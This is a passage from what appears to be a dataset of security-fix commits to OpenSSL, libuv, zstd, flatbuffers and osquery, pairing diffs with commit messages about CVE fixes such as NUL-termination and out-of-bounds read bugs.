    \       if (ia5ncasecmp(baseptr, emlptr, base->length) == 0)\n               \
    \  return X509_V_OK;\n         }\n         return X509_V_ERR_PERMITTED_VIOLATION;\n\
    @@ -676,8 +722,10 @@ static int nc_email(ASN1_IA5STRING *eml, ASN1_IA5STRING *base)\n\
    \         baseptr = baseat + 1;\n     }\n     emlptr = emlat + 1;\n+    basehostlen\
    \ = IA5_OFFSET_LEN(base, baseptr);\n+    emlhostlen = IA5_OFFSET_LEN(eml, emlptr);\n\
    \     /* Just have hostname left to match: case insensitive */\n-    if (ia5casecmp(baseptr,\
    \ emlptr))\n+    if (basehostlen != emlhostlen || ia5ncasecmp(baseptr, emlptr,\
    \ emlhostlen))\n         return X509_V_ERR_PERMITTED_VIOLATION;\n \n     return\
    \ X509_V_OK;\n@@ -688,33 +736,36 @@ static int nc_uri(ASN1_IA5STRING *uri, ASN1_IA5STRING\
    \ *base)\n {\n     const char *baseptr = (char *)base->data;\n     const char\
    \ *hostptr = (char *)uri->data;\n-    const char *p = strchr(hostptr, ':');\n\
    +    const char *p = ia5memchr(uri, (char *)uri->data, ':');\n     int hostlen;\n\
    \ \n     /* Check for foo:// and skip past it */\n-    if (p == NULL || p[1] !=\
    \ '/' || p[2] != '/')\n+    if (p == NULL\n+            || IA5_OFFSET_LEN(uri,\
    \ p) < 3\n+            || p[1] != '/'\n+            || p[2] != '/')\n        \
    \ return X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n     hostptr = p + 3;\n \n     /*\
    \ Determine length of hostname part of URI */\n \n     /* Look for a port indicator\
    \ as end of hostname first */\n \n-    p = strchr(hostptr, ':');\n+    p = ia5memchr(uri,\
    \ hostptr, ':');\n     /* Otherwise look for trailing slash */\n     if (p ==\
    \ NULL)\n-        p = strchr(hostptr, '/');\n+        p = ia5memchr(uri, hostptr,\
    \ '/');\n \n     if (p == NULL)\n-        hostlen = strlen(hostptr);\n+      \
    \  hostlen = IA5_OFFSET_LEN(uri, hostptr);\n     else\n         hostlen = p -\
    \ hostptr;\n \n     if (hostlen == 0)\n         return X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n\
    \ \n     /* Special case: initial '.' is RHS match */\n-    if (*baseptr == '.')\
    \ {\n+    if (base->length > 0 && *baseptr == '.') {\n         if (hostlen > base->length)\
    \ {\n             p = hostptr + hostlen - base->length;\n             if (ia5ncasecmp(p,\
    \ baseptr, base->length) == 0)"
  commit_message: 'Fix the name constraints code to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: d2015a783e64613d8e4a142fa05048d1863df944
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/v3_pci.c\n+++ b/crypto/x509/v3_pci.c\n@@ -76,7 +76,8 @@ static\
    \ int i2r_pci(X509V3_EXT_METHOD *method, PROXY_CERT_INFO_EXTENSION *pci,\n   \
    \  BIO_printf(out, \"%*sPolicy Language: \", indent, \"\");\n     i2a_ASN1_OBJECT(out,\
    \ pci->proxyPolicy->policyLanguage);\n     if (pci->proxyPolicy->policy && pci->proxyPolicy->policy->data)\n\
    -        BIO_printf(out, \"\\n%*sPolicy Text: %s\", indent, \"\",\n+        BIO_printf(out,\
    \ \"\\n%*sPolicy Text: %.*s\", indent, \"\",\n+                   pci->proxyPolicy->policy->length,\n\
    \                    pci->proxyPolicy->policy->data);\n     return 1;\n }"
  commit_message: 'Fix printing of PROXY_CERT_INFO_EXTENSION to not assume NUL terminated
    strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: 918430ba80d94ec8f05383b43b1872b1ebb13e1a
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/v3_san.c\n+++ b/crypto/x509/v3_san.c\n@@ -223,23 +223,28 @@\
    \ int GENERAL_NAME_print(BIO *out, GENERAL_NAME *gen)\n \n         switch (nid)\
    \ {\n         case NID_id_on_SmtpUTF8Mailbox:\n-            BIO_printf(out, \"\
    othername:SmtpUTF8Mailbox:%s\",\n+            BIO_printf(out, \"othername:SmtpUTF8Mailbox:%.*s\"\
    ,\n+                       gen->d.otherName->value->value.utf8string->length,\n\
    \                        gen->d.otherName->value->value.utf8string->data);\n \
    \            break;\n         case NID_XmppAddr:\n-            BIO_printf(out,\
    \ \"othername:XmppAddr:%s\",\n+            BIO_printf(out, \"othername:XmppAddr:%.*s\"\
    ,\n+                       gen->d.otherName->value->value.utf8string->length,\n\
    \                        gen->d.otherName->value->value.utf8string->data);\n \
    \            break;\n         case NID_SRVName:\n-            BIO_printf(out,\
    \ \"othername:SRVName:%s\",\n+            BIO_printf(out, \"othername:SRVName:%.*s\"\
    ,\n+                       gen->d.otherName->value->value.ia5string->length,\n\
    \                        gen->d.otherName->value->value.ia5string->data);\n  \
    \           break;\n         case NID_ms_upn:\n-            BIO_printf(out, \"\
    othername:UPN:%s\",\n+            BIO_printf(out, \"othername:UPN:%.*s\",\n+ \
    \                      gen->d.otherName->value->value.utf8string->length,\n  \
    \                      gen->d.otherName->value->value.utf8string->data);\n   \
    \          break;\n         case NID_NAIRealm:\n-            BIO_printf(out, \"\
    othername:NAIRealm:%s\",\n+            BIO_printf(out, \"othername:NAIRealm:%.*s\"\
    ,\n+                       gen->d.otherName->value->value.utf8string->length,\n\
    \                        gen->d.otherName->value->value.utf8string->data);\n \
    \            break;\n         default:"
  commit_message: 'Fix GENERAL_NAME_print to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: b2b3b9c9936b91315adc0f3254879cb2fd5ca2bd
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/v3_cpols.c\n+++ b/crypto/x509/v3_cpols.c\n@@ -426,7 +426,8\
    \ @@ static void print_qualifiers(BIO *out, STACK_OF(POLICYQUALINFO) *quals,\n\
    \         qualinfo = sk_POLICYQUALINFO_value(quals, i);\n         switch (OBJ_obj2nid(qualinfo->pqualid))\
    \ {\n         case NID_id_qt_cps:\n-            BIO_printf(out, \"%*sCPS: %s\"\
    , indent, \"\",\n+            BIO_printf(out, \"%*sCPS: %.*s\", indent, \"\",\n\
    +                       qualinfo->d.cpsuri->length,\n                        qualinfo->d.cpsuri->data);\n\
    \             break;\n \n@@ -450,7 +451,8 @@ static void print_notice(BIO *out,\
    \ USERNOTICE *notice, int indent)\n     if (notice->noticeref) {\n         NOTICEREF\
    \ *ref;\n         ref = notice->noticeref;\n-        BIO_printf(out, \"%*sOrganization:\
    \ %s\\n\", indent, \"\",\n+        BIO_printf(out, \"%*sOrganization: %.*s\\n\"\
    , indent, \"\",\n+                   ref->organization->length,\n            \
    \        ref->organization->data);\n         BIO_printf(out, \"%*sNumber%s: \"\
    , indent, \"\",\n                    sk_ASN1_INTEGER_num(ref->noticenos) > 1 ?\
    \ \"s\" : \"\");\n@@ -474,7 +476,8 @@ static void print_notice(BIO *out, USERNOTICE\
    \ *notice, int indent)\n             BIO_puts(out, \"\\n\");\n     }\n     if\
    \ (notice->exptext)\n-        BIO_printf(out, \"%*sExplicit Text: %s\", indent,\
    \ \"\",\n+        BIO_printf(out, \"%*sExplicit Text: %.*s\", indent, \"\",\n\
    +                   notice->exptext->length,\n                    notice->exptext->data);\n\
    \ }\n "
  commit_message: 'Fix POLICYINFO printing to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: 1747d4658b3830951068a6a6c1fa2b45c4731fb3
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/v3_san.c\n+++ b/crypto/x509/v3_san.c\n@@ -9,6 +9,7 @@\n \n\
    \ #include <stdio.h>\n #include \"internal/cryptlib.h\"\n+#include \"crypto/x509.h\"\
    \n #include <openssl/conf.h>\n #include <openssl/x509v3.h>\n #include <openssl/bio.h>\n\
    @@ -87,36 +88,41 @@ STACK_OF(CONF_VALUE) *i2v_GENERAL_NAME(X509V3_EXT_METHOD *method,\n\
    \         switch (OBJ_obj2nid(gen->d.otherName->type_id)) {\n         case NID_id_on_SmtpUTF8Mailbox:\n\
    \             if (gen->d.otherName->value->type != V_ASN1_UTF8STRING\n-      \
    \              || !X509V3_add_value_uchar(\"othername: SmtpUTF8Mailbox:\",\n+\
    \                    || !x509v3_add_len_value_uchar(\"othername: SmtpUTF8Mailbox:\"\
    ,\n                             gen->d.otherName->value->value.utf8string->data,\n\
    +                            gen->d.otherName->value->value.utf8string->length,\n\
    \                             &ret))\n                 return NULL;\n        \
    \     break;\n         case NID_XmppAddr:\n             if (gen->d.otherName->value->type\
    \ != V_ASN1_UTF8STRING\n-                    || !X509V3_add_value_uchar(\"othername:\
    \ XmppAddr:\",\n+                    || !x509v3_add_len_value_uchar(\"othername:\
    \ XmppAddr:\",\n                             gen->d.otherName->value->value.utf8string->data,\n\
    +                            gen->d.otherName->value->value.utf8string->length,\n\
    \                             &ret))\n                 return NULL;\n        \
    \     break;\n         case NID_SRVName:\n             if (gen->d.otherName->value->type\
    \ != V_ASN1_IA5STRING\n-                    || !X509V3_add_value_uchar(\"othername:\
    \ SRVName:\",\n+                    || !x509v3_add_len_value_uchar(\"othername:\
    \ SRVName:\",\n                             gen->d.otherName->value->value.ia5string->data,\n\
    +                            gen->d.otherName->value->value.ia5string->length,\n\
    \                             &ret))\n                 return NULL;\n        \
    \     break;\n         case NID_ms_upn:\n             if (gen->d.otherName->value->type\
    \ != V_ASN1_UTF8STRING\n-                    || !X509V3_add_value_uchar(\"othername:\
    \ UPN:\",\n+                    || !x509v3_add_len_value_uchar(\"othername: UPN:\"\
    ,\n                             gen->d.otherName->value->value.utf8string->data,\n\
    +                            gen->d.otherName->value->value.utf8string->length,\n\
    \                             &ret))\n                 return NULL;\n        \
    \     break;\n         case NID_NAIRealm:\n             if (gen->d.otherName->value->type\
    \ != V_ASN1_UTF8STRING\n-                    || !X509V3_add_value_uchar(\"othername:\
    \ NAIRealm:\",\n+                    || !x509v3_add_len_value_uchar(\"othername:\
    \ NAIRealm:\",\n                             gen->d.otherName->value->value.utf8string->data,\n\
    +                            gen->d.otherName->value->value.utf8string->length,\n\
    \                             &ret))\n                 return NULL;\n        \
    \     break;\n@@ -129,14 +135,16 @@ STACK_OF(CONF_VALUE) *i2v_GENERAL_NAME(X509V3_EXT_METHOD\
    \ *method,\n \n             /* check if the value is something printable */\n\
    \             if (gen->d.otherName->value->type == V_ASN1_IA5STRING) {\n-    \
    \            if (X509V3_add_value_uchar(othername,\n+                if (x509v3_add_len_value_uchar(othername,\n\
    \                              gen->d.otherName->value->value.ia5string->data,\n\
    +                             gen->d.otherName->value->value.ia5string->length,\n\
    \                              &ret)) \n                     return ret;\n   \
    \          }\n             if (gen->d.otherName->value->type == V_ASN1_UTF8STRING)\
    \ {\n-                if (X509V3_add_value_uchar(othername,\n+               \
    \ if (x509v3_add_len_value_uchar(othername,\n                              gen->d.otherName->value->value.utf8string->data,\n\
    +                             gen->d.otherName->value->value.utf8string->length,\n\
    \                              &ret)) \n                     return ret;\n   \
    \          }\n@@ -157,17 +165,20 @@ STACK_OF(CONF_VALUE) *i2v_GENERAL_NAME(X509V3_EXT_METHOD\
    \ *method,\n         break;\n \n     case GEN_EMAIL:\n-        if (!X509V3_add_value_uchar(\"\
    email\", gen->d.ia5->data, &ret))\n+        if (!x509v3_add_len_value_uchar(\"\
    email\", gen->d.ia5->data,\n+                                        gen->d.ia5->length,\
    \ &ret))\n             return NULL;\n         break;\n \n     case GEN_DNS:\n\
    -        if (!X509V3_add_value_uchar(\"DNS\", gen->d.ia5->data, &ret))\n+    \
    \    if (!x509v3_add_len_value_uchar(\"DNS\", gen->d.ia5->data,\n+           \
    \                             gen->d.ia5->length, &ret))\n             return\
    \ NULL;\n         break;\n \n     case GEN_URI:\n-        if (!X509V3_add_value_uchar(\"\
    URI\", gen->d.ia5->data, &ret))\n+        if (!x509v3_add_len_value_uchar(\"URI\"\
    , gen->d.ia5->data,\n+                                        gen->d.ia5->length,\
    \ &ret))\n             return NULL;\n         break;\n "
  - "--- a/crypto/x509/v3_utl.c\n+++ b/crypto/x509/v3_utl.c\n@@ -12,6 +12,7 @@\n #include\
    \ \"e_os.h\"\n #include \"internal/cryptlib.h\"\n #include <stdio.h>\n+#include\
    \ <string.h>\n #include \"crypto/ctype.h\"\n #include <openssl/conf.h>\n #include\
    \ <openssl/crypto.h>\n@@ -36,17 +37,23 @@ static int ipv6_hex(unsigned char *out,\
    \ const char *in, int inlen);\n \n /* Add a CONF_VALUE name value pair to stack\
    \ */\n \n-int X509V3_add_value(const char *name, const char *value,\n-       \
    \              STACK_OF(CONF_VALUE) **extlist)\n+static int x509v3_add_len_value(const\
    \ char *name, const char *value,\n+                                size_t vallen,\
    \ STACK_OF(CONF_VALUE) **extlist)\n {\n     CONF_VALUE *vtmp = NULL;\n     char\
    \ *tname = NULL, *tvalue = NULL;\n     int sk_allocated = (*extlist == NULL);\n\
    \ \n-    if (name && (tname = OPENSSL_strdup(name)) == NULL)\n-        goto err;\n\
    -    if (value && (tvalue = OPENSSL_strdup(value)) == NULL)\n+    if (name !=\
    \ NULL && (tname = OPENSSL_strdup(name)) == NULL)\n         goto err;\n+    if\
    \ (value != NULL) {\n+        /* We don't allow embeded NUL characters */\n+ \
    \       if (memchr(value, 0, vallen) != NULL)\n+            goto err;\n+     \
    \   tvalue = OPENSSL_strndup(value, vallen);\n+        if (tvalue == NULL)\n+\
    \            goto err;\n+    }\n     if ((vtmp = OPENSSL_malloc(sizeof(*vtmp)))\
    \ == NULL)\n         goto err;\n     if (sk_allocated && (*extlist = sk_CONF_VALUE_new_null())\
    \ == NULL)\n@@ -69,10 +76,26 @@ int X509V3_add_value(const char *name, const char\
    \ *value,\n     return 0;\n }\n \n+int X509V3_add_value(const char *name, const\
    \ char *value,\n+                     STACK_OF(CONF_VALUE) **extlist)\n+{\n+ \
    \   return x509v3_add_len_value(name, value,\n+                              \
    \  value != NULL ? strlen((const char *)value) : 0,\n+                       \
    \         extlist);\n+}\n+\n int X509V3_add_value_uchar(const char *name, const\
    \ unsigned char *value,\n                            STACK_OF(CONF_VALUE) **extlist)\n\
    \ {\n-    return X509V3_add_value(name, (const char *)value, extlist);\n+    return\
    \ x509v3_add_len_value(name, (const char *)value,\n+                         \
    \       value != NULL ? strlen((const char *)value) : 0,\n+                  \
    \              extlist);\n+}\n+\n+int x509v3_add_len_value_uchar(const char *name,\
    \ const unsigned char *value,\n+                               size_t vallen,\
    \ STACK_OF(CONF_VALUE) **extlist)\n+{\n+    return x509v3_add_len_value(name,\
    \ (const char *)value, vallen, extlist);\n }\n \n /* Free function for STACK_OF(CONF_VALUE)\
    \ */"
  commit_message: 'Fix i2v_GENERAL_NAME to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: ad6ac17489241574136b7d035f01f6175dd9c941
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/src/idna.c\n+++ b/src/idna.c\n@@ -19,6 +19,7 @@\n \n #include \"uv.h\"\n\
    \ #include \"idna.h\"\n+#include <assert.h>\n #include <string.h>\n \n static\
    \ unsigned uv__utf8_decode1_slow(const char** p,\n@@ -32,7 +33,7 @@ static unsigned\
    \ uv__utf8_decode1_slow(const char** p,\n   if (a > 0xF7)\n     return -1;\n \n\
    -  switch (*p - pe) {\n+  switch (pe - *p) {\n   default:\n     if (a > 0xEF)\
    \ {\n       min = 0x10000;\n@@ -62,6 +63,8 @@ static unsigned uv__utf8_decode1_slow(const\
    \ char** p,\n       a = 0;\n       break;\n     }\n+    /* Fall through. */\n\
    +  case 0:\n     return -1;  /* Invalid continuation byte. */\n   }\n \n@@ -88,6\
    \ +91,8 @@ static unsigned uv__utf8_decode1_slow(const char** p,\n unsigned uv__utf8_decode1(const\
    \ char** p, const char* pe) {\n   unsigned a;\n \n+  assert(*p < pe);\n+\n   a\
    \ = (unsigned char) *(*p)++;\n \n   if (a < 128)\n@@ -96,9 +101,6 @@ unsigned\
    \ uv__utf8_decode1(const char** p, const char* pe) {\n   return uv__utf8_decode1_slow(p,\
    \ pe, a);\n }\n \n-#define foreach_codepoint(c, p, pe) \\\n-  for (; (void) (*p\
    \ <= pe && (c = uv__utf8_decode1(p, pe))), *p <= pe;)\n-\n static int uv__idna_toascii_label(const\
    \ char* s, const char* se,\n                                   char** d, char*\
    \ de) {\n   static const char alphabet[] = \"abcdefghijklmnopqrstuvwxyz0123456789\"\
    ;\n@@ -121,25 +123,36 @@ static int uv__idna_toascii_label(const char* s, const\
    \ char* se,\n   ss = s;\n   todo = 0;\n \n-  foreach_codepoint(c, &s, se) {\n\
    +  /* Note: after this loop we've visited all UTF-8 characters and know\n+   *\
    \ they're legal so we no longer need to check for decode errors.\n+   */\n+  while\
    \ (s < se) {\n+    c = uv__utf8_decode1(&s, se);\n+\n+    if (c == -1u)\n+   \
    \   return UV_EINVAL;\n+\n     if (c < 128)\n       h++;\n-    else if (c == (unsigned)\
    \ -1)\n-      return UV_EINVAL;\n     else\n       todo++;\n   }\n \n+  /* Only\
    \ write \"xn--\" when there are non-ASCII characters. */\n   if (todo > 0) {\n\
    \     if (*d < de) *(*d)++ = 'x';\n     if (*d < de) *(*d)++ = 'n';\n     if (*d\
    \ < de) *(*d)++ = '-';\n     if (*d < de) *(*d)++ = '-';\n   }\n \n+  /* Write\
    \ ASCII characters. */\n   x = 0;\n   s = ss;\n-  foreach_codepoint(c, &s, se)\
    \ {\n+  while (s < se) {\n+    c = uv__utf8_decode1(&s, se);\n+    assert(c !=\
    \ -1u);\n+\n     if (c > 127)\n       continue;\n \n@@ -166,10 +179,15 @@ static\
    \ int uv__idna_toascii_label(const char* s, const char* se,\n   while (todo >\
    \ 0) {\n     m = -1;\n     s = ss;\n-    foreach_codepoint(c, &s, se)\n+\n+  \
    \  while (s < se) {\n+      c = uv__utf8_decode1(&s, se);\n+      assert(c !=\
    \ -1u);\n+\n       if (c >= n)\n         if (c < m)\n           m = c;\n+    }\n\
    \ \n     x = m - n;\n     y = h + 1;\n@@ -181,7 +199,10 @@ static int uv__idna_toascii_label(const\
    \ char* s, const char* se,\n     n = m;\n \n     s = ss;\n-    foreach_codepoint(c,\
    \ &s, se) {\n+    while (s < se) {\n+      c = uv__utf8_decode1(&s, se);\n+  \
    \    assert(c != -1u);\n+\n       if (c < n)\n         if (++delta == 0)\n   \
    \        return UV_E2BIG;  /* Overflow. */\n@@ -245,8 +266,6 @@ static int uv__idna_toascii_label(const\
    \ char* s, const char* se,\n   return 0;\n }\n \n-#undef foreach_codepoint\n-\n\
    \ long uv__idna_toascii(const char* s, const char* se, char* d, char* de) {\n\
    \   const char* si;\n   const char* st;\n@@ -256,10 +275,14 @@ long uv__idna_toascii(const\
    \ char* s, const char* se, char* d, char* de) {\n \n   ds = d;\n \n-  for (si\
    \ = s; si < se; /* empty */) {\n+  si = s;\n+  while (si < se) {\n     st = si;\n\
    \     c = uv__utf8_decode1(&si, se);\n \n+    if (c == -1u)\n+      return UV_EINVAL;\n\
    +\n     if (c != '.')\n       if (c != 0x3002)  /* \u3002 */\n         if (c !=\
    \ 0xFF0E)  /* \uFF0E */"
  - "--- a/test/test-idna.c\n+++ b/test/test-idna.c\n@@ -96,6 +96,25 @@ TEST_IMPL(utf8_decode1)\
    \ {\n   return 0;\n }\n \n+TEST_IMPL(utf8_decode1_overrun) {\n+  const char* p;\n\
    +  char b[1];\n+\n+  /* Single byte. */\n+  p = b;\n+  b[0] = 0x7F;\n+  ASSERT_EQ(0x7F,\
    \ uv__utf8_decode1(&p, b + 1));\n+  ASSERT_EQ(p, b + 1);\n+\n+  /* Multi-byte.\
    \ */\n+  p = b;\n+  b[0] = 0xC0;\n+  ASSERT_EQ((unsigned) -1, uv__utf8_decode1(&p,\
    \ b + 1));\n+  ASSERT_EQ(p, b + 1);\n+\n+  return 0;\n+}\n+\n /* Doesn't work\
    \ on z/OS because that platform uses EBCDIC, not ASCII. */\n #ifndef __MVS__\n\
    \ "
  commit_message: 'idna: fix OOB read in punycode decoder


    libuv was vulnerable to out-of-bounds reads in the uv__idna_toascii()

    function which is used to convert strings to ASCII. This is called by

    the DNS resolution function and can lead to information disclosures or

    crashes.


    Reported by Eric Sesterhenn in collaboration with Cure53 and ExpressVPN.


    Reported-By: Eric Sesterhenn <eric.sesterhenn@x41-dsec.de>

    Fixes: https://github.com/libuv/libuv/issues/3147

    PR-URL: https://github.com/libuv/libuv-private/pull/1

    Refs: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22918

    Reviewed-By: Colin Ihrig <cjihrig@gmail.com>

    Reviewed-By: Richard Lau <riclau@uk.ibm.com>'
  commit_sha: b7466e31e4bee160d82a68fca11b1f61d46debae
  repo_name: libuv/libuv
- commit_diff:
  - "--- a/src/unix/udp.c\n+++ b/src/unix/udp.c\n@@ -504,6 +504,28 @@ static int uv__set_reuse(int\
    \ fd) {\n   return 0;\n }\n \n+/*\n+ * The Linux kernel suppresses some ICMP error\
    \ messages by default for UDP\n+ * sockets. Setting IP_RECVERR/IPV6_RECVERR on\
    \ the socket enables full ICMP\n+ * error reporting, hopefully resulting in faster\
    \ failover to working name\n+ * servers.\n+ */\n+static int uv__set_recverr(int\
    \ fd, sa_family_t ss_family) {\n+#if defined(__linux__)\n+  int yes;\n+\n+  yes\
    \ = 1;\n+  if (ss_family == AF_INET) {\n+    if (setsockopt(fd, IPPROTO_IP, IP_RECVERR,\
    \ &yes, sizeof(yes)))\n+      return UV__ERR(errno);\n+  } else if (ss_family\
    \ == AF_INET6) {\n+    if (setsockopt(fd, IPPROTO_IPV6, IPV6_RECVERR, &yes, sizeof(yes)))\n\
    +       return UV__ERR(errno);\n+  }\n+#endif\n+  return 0;\n+}\n+\n \n int uv__udp_bind(uv_udp_t*\
    \ handle,\n                  const struct sockaddr* addr,\n@@ -514,7 +536,7 @@\
    \ int uv__udp_bind(uv_udp_t* handle,\n   int fd;\n \n   /* Check for bad flags.\
    \ */\n-  if (flags & ~(UV_UDP_IPV6ONLY | UV_UDP_REUSEADDR))\n+  if (flags & ~(UV_UDP_IPV6ONLY\
    \ | UV_UDP_REUSEADDR | UV_UDP_LINUX_RECVERR))\n     return UV_EINVAL;\n \n   /*\
    \ Cannot set IPv6-only mode on non-IPv6 socket. */\n@@ -530,6 +552,12 @@ int uv__udp_bind(uv_udp_t*\
    \ handle,\n     handle->io_watcher.fd = fd;\n   }\n \n+  if (flags & UV_UDP_LINUX_RECVERR)\
    \ {\n+    err = uv__set_recverr(fd, addr->sa_family);\n+    if (err)\n+      return\
    \ err;\n+  }\n+\n   if (flags & UV_UDP_REUSEADDR) {\n     err = uv__set_reuse(fd);\n\
    \     if (err)"
  commit_message: 'linux,udp: enable full ICMP error reporting


    The Linux kernel suppresses some ICMP error messages by default for UDP

    sockets. This commit sets IP_RECVERR/IPV6_RECVERR on the socket to

    enable full ICMP error reporting, hopefully resulting in faster failover

    to working name servers.


    PR-URL: https://github.com/libuv/libuv/pull/2872

    Reviewed-By: Ben Noordhuis <info@bnoordhuis.nl>

    Reviewed-By: Santiago Gimeno <santiago.gimeno@gmail.com>'
  commit_sha: c382d39a85c1edbaf96f0cd84385cd6549c0bde2
  repo_name: libuv/libuv
- commit_diff:
  - "--- a/programs/fileio.c\n+++ b/programs/fileio.c\n@@ -1011,8 +1011,8 @@ int FIO_compressMultipleFilenames(const\
    \ char** inFileNamesTable, unsigned nbFile\n                 if (!dstFileName)\
    \ {\n                     EXM_THROW(30, \"zstd: %s\", strerror(errno));\n    \
    \         }   }\n-            strcpy(dstFileName, inFileNamesTable[u]);\n-   \
    \         strcat(dstFileName, suffix);\n+            strncpy(dstFileName, inFileNamesTable[u],\
    \ ifnSize+1 /* Include null */);\n+            strncat(dstFileName, suffix, suffixSize);\n\
    \             missed_files += FIO_compressFilename_dstFile(ress, dstFileName,\
    \ inFileNamesTable[u], compressionLevel);\n     }   }\n "
  commit_message: 'Fixed unsafe string copy and concat in `fileio.c`.


    Per warnings from flawfinder: "Does not check for buffer overflows when

    copying to destination [MS-banned] (CWE-120). Consider using snprintf,

    strcpy_s, or strlcpy (warning: strncpy easily misused).".


    Replaced called to strcpy and strcat in `fileio.c` to calls with a

    specified size (`strncpy` and `strncat`).


    Tested the changes on OSX, Linux, Windows.

    On OSX + Linux, changes were tested with ASAN. The following flags were

    used: ''check_initialization_order=1:strict_init_order=1:detect_odr_violation=1:detect_stack_use_after_return=1''


    To reproduce warning:

    ./flawfinder.py ./programs/fileio.c'
  commit_sha: 78af534f82e32277d3272881d4351363ab1e3488
  repo_name: facebook/zstd
- commit_diff:
  - "--- a/src/flatc.cpp\n+++ b/src/flatc.cpp\n@@ -435,8 +435,7 @@ int FlatCompiler::Compile(int\
    \ argc, const char **argv) {\n         }\n       } else {\n         ParseFile(*parser.get(),\
    \ filename, contents, include_directories);\n-        if (!opts.use_flexbuffers\
    \ && !is_schema &&\n-            !parser->builder_.GetSize()) {\n+        if (!is_schema\
    \ && !parser->builder_.GetSize()) {\n           // If a file doesn't end in .fbs,\
    \ it must be json/binary. Ensure we\n           // didn't just parse a schema\
    \ with a different extension.\n           Error(\"input file is neither json nor\
    \ a .fbs (schema) file: \" +"
  commit_message: "[flatc] Remove an always true condition for flexbuffers (#5604)\n\
    \nThe condition was unnecessary and Detected by\r\n\r\nPVS-Studio\r\nV560 [CWE-571]\
    \ A part of conditional expression is always true: !opts.use_flexbuffers. flatc.cpp\
    \ 438"
  commit_sha: 3c7b660d623b160c24fe72290011cb23be858fc2
  repo_name: google/flatbuffers
- commit_diff:
  - '--- a/libraries/cmake/source/yara/patches/strutils.cpp

    +++ b/libraries/cmake/source/yara/patches/strutils.cpp

    @@ -1,61 +0,0 @@

    -#pragma once

    -

    -#include <stdio.h>

    -#include <string.h>

    -#include <yara/strutils.h>

    -

    -#undef HAVE_STRLCPY

    -#define HAVE_STRLCPY 0

    -#undef strlcpy

    -

    -#undef HAVE_STRLCAT

    -#define HAVE_STRLCAT 0

    -#undef strlcat

    -

    -#undef HAVE_MEMMEM

    -#define HAVE_MEMMEM 0

    -#undef memmem

    -

    -namespace yara_strutils {

    -

    -#include "strutils.c"

    -

    -}

    -

    -extern "C" {

    -

    -size_t yara_strutils_strlcpy(char* dst, const char* src, size_t size) {

    -  return yara_strutils::strlcpy(dst, src, size);

    -}

    -

    -uint64_t yara_strutils_xtoi(const char* hexstr) {

    -  return yara_strutils::xtoi(hexstr);

    -}

    -

    -int yara_strutils_strnlen_w(const char* w_str) {

    -  return yara_strutils::strnlen_w(w_str);

    -}

    -

    -size_t yara_strutils_strlcpy_w(char* dst, const char* w_src, size_t n) {

    -  return yara_strutils::strlcpy_w(dst, w_src, n);

    -}

    -

    -int yara_strutils_strcmp_w(const char* w_str, const char* str) {

    -  return yara_strutils::strcmp_w(w_str, str);

    -}

    -

    -size_t yara_strutils_strlcat(char* dst, const char* src, size_t size) {

    -  return yara_strutils::strlcat(dst, src, size);

    -}

    -

    -void* yara_strutils_memmem(const void* haystack,

    -                           size_t haystack_size,

    -                           const void* needle,

    -                           size_t needle_size) {

    -  return yara_strutils::memmem(haystack, haystack_size, needle, needle_size);

    -}

    -

    -int yara_strutils_isalnum(const uint8_t* s) {

    -  return yara_strutils::yr_isalnum(s);

    -}

    -}'
  commit_message: "cve: Update yara to 4.2.3 (#7912)\n\n- Resolves CVE-2021-45429\r\
    \n- Avoid symbol collision from libmagic"
  commit_sha: 78a8e3945e13d65d9e96e7f15074e22925aa0cbc
  repo_name: osquery/osquery
- commit_diff:
  - '--- a/osquery/tables/system/linux/elf_info.cpp

    +++ b/osquery/tables/system/linux/elf_info.cpp

    @@ -1,213 +0,0 @@

    -/**

    - * Copyright (c) 2014-present, The osquery authors

    - *

    - * This source code is licensed as defined by the LICENSE file found in the

    - * root directory of this source tree.

    - *

    - * SPDX-License-Identifier: (Apache-2.0 OR GPL-2.0-only)

    - */

    -

    -#include <elf.h>

    -#include <fcntl.h>

    -

    -#include <libelfin/elf/elf++.hh>

    -

    -#include <unordered_map>

    -

    -#include <osquery/core/tables.h>

    -#include <osquery/filesystem/filesystem.h>

    -#include <osquery/logger/logger.h>

    -

    -namespace osquery {

    -namespace tables {

    -

    -const std::unordered_map<elf::ElfTypes::Word, std::string> kGNUTypes{

    -    {0x6474e550, "GNU_EH_FRAME"},

    -    {0x6474E551, "GNU_STACK"},

    -    {0x6474E552, "GNU_RELRO"},

    -};

    -

    -void genElfInfo(

    -    QueryContext& ctx,

    -    std::function<void(const elf::elf&, const std::string&)> predicate) {

    -  // Resolve file paths for EQUALS and LIKE operations.

    -  auto paths = ctx.constraints["path"].getAll(EQUALS);

    -  ctx.expandConstraints(

    -      "path",

    -      LIKE,

    -      paths,

    -      ([&](const std::string& pattern, std::set<std::string>& out) {

